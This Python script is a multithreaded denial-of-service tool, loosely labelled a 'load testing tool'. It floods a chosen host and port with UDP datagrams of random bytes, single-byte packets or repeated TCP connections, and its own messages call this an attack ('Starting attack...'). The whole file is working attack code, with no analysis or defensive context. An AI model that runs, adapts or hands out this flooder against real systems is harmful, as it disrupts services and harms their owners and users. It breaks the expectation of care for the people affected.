import logging
import os
import socket
import time
from sys import argv
from threading import Thread
from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM
import argparse
# Define the logger
logger = logging.getLogger(__name__)

def start_sock(host, port, secs):
    timeout = time.time() + int(secs)
    while time.time() <= timeout:
        try:
            with socket(AF_INET, SOCK_STREAM) as sock:
                sock.connect((host, int(port)))
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            logger.error(f"Error connecting to {host}:{port}: {e}")
            continue


def start_pps(host, port, secs):
    timeout = time.time() + int(secs)
    with socket(AF_INET, SOCK_DGRAM) as sock:
        while time.time() <= timeout:
            try:
                random_byte = os.urandom(1)
                sock.sendto(random_byte, (host, int(port)))
            except KeyboardInterrupt:
                exit()
            except Exception as e:
                logger.error(f"Error sending to {host}:{port}: {e}")
                continue


def start_udp(host, port, secs):
    timeout = time.time() + int(secs)
    with socket(AF_INET, SOCK_DGRAM) as sock:
        while time.time() <= timeout:
            try:
                random_data = os.urandom(256)
                sock.sendto(random_data, (host, int(port)))
            except KeyboardInterrupt:
                exit()
            except Exception as e:
                logger.error(f"Error sending to {host}:{port}: {e}")
                continue

def check_target_status(host, port):
    try:
        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.settimeout(5)
            sock.connect((host, int(port)))
        return True
    except Exception as e:
        logger.error(f"Error connecting to {host}:{port}: {e}")
        return False


class Public:

    def __init__(self, mode: str, host: str, port: int, secs: int, threads: int) -> None:
        self.mode = mode
        self.host = host
        self.port = port
        self.secs = secs
        self.threads = threads

    def main(self):
        parser = argparse.ArgumentParser(description="Performing network load testing tool")
        parser.add_argument("--mode", type=str, choices=["udp", "pps", "sock"],
                            help="mode of attack to perform")
        parser.add_argument("--host", type=str, help="Target host IP or domain name")
        parser.add_argument("--port", type=int, default=80,  help="Target host port")
        parser.add_argument("--secs", type=int, help="Number of seconds to run attack for")
        parser.add_argument("--threads", type=int, default=100, help="Number of threads to run")
        # parser.add_argument("--pps", type=int, default=100, help="Number of packets per second to send (only for UDP attack)")
        args = parser.parse_args()

        if args.mode == "udp":
            for _ in range(self.threads):
                try:
                    Thread(target=start_udp, args=[self.host, self.port, self.secs], daemon=True).start()
                except Exception as e:
                    logger.error(f"Error starting UDP thread: {e}")
                    continue

        if args.mode == "pps":
            for _ in range(self.threads):
                try:
                    Thread(target=start_pps, args=[self.host, self.port, self.secs], daemon=True).start()
                except Exception as e:
                    logger.error(f"Error starting PPS thread: {e}")
                    continue

        if args.mode == "sock":
            if check_target_status(self.host, self.port):
                print(f"Target {self.host}:{self.port} is online. Starting attack...")
                for _ in range(self.threads):
                    try:
                        Thread(target=start_sock, args=[self.host, self.port, self.secs], daemon=True).start()
                    except Exception as e:
                        logger.error(f"Error starting SOCK thread: {e}")
                        continue
            else:
                print(f"Target {self.host}:{self.port} is offline. Aborting attack...")
                return

        if args.mode is None:
            parser.print_help()
            return

        # if argv[1].lower() in ["udp"]:
        #     start_udp(self.host, self.port, self.secs)
        #
        #
        # if argv[1].lower() in ["pps"]:
        #     for _ in range(self.threads):
        #         try:
        #             Thread(target = start_pps, args = [ self.host, self.port, self.secs ], daemon = True).start()
        #         except Exception as e:
        #             logger.error(f"Error starting PPS thread: {e}")
        #             continue
        #     start_pps(self.host, self.port, self.secs)
        #
        # if argv[1].lower() in ["sock"]:
        #     for _ in range(self.threads):
        #         try:
        #             Thread(target = start_sock, args = [ self.host, self.port, self.secs ], daemon = True).start()
        #         except Exception as e:
        #             logger.error(f"Error starting SOCK thread: {e}")
        #             continue
        #             # Check target status before and after the attack
        #         if check_target_status(self.host, self.port):
        #             print(f"Target {self.host}:{self.port} is online. Starting attack...")
        #             start_sock(self.host, self.port, self.secs)
        #             if not check_target_status(self.host, self.port):
        #                 print(f"Target {self.host}:{self.port} is offline.")
        #         else:
        #             print(f"Target {self.host}:{self.port} is offline.")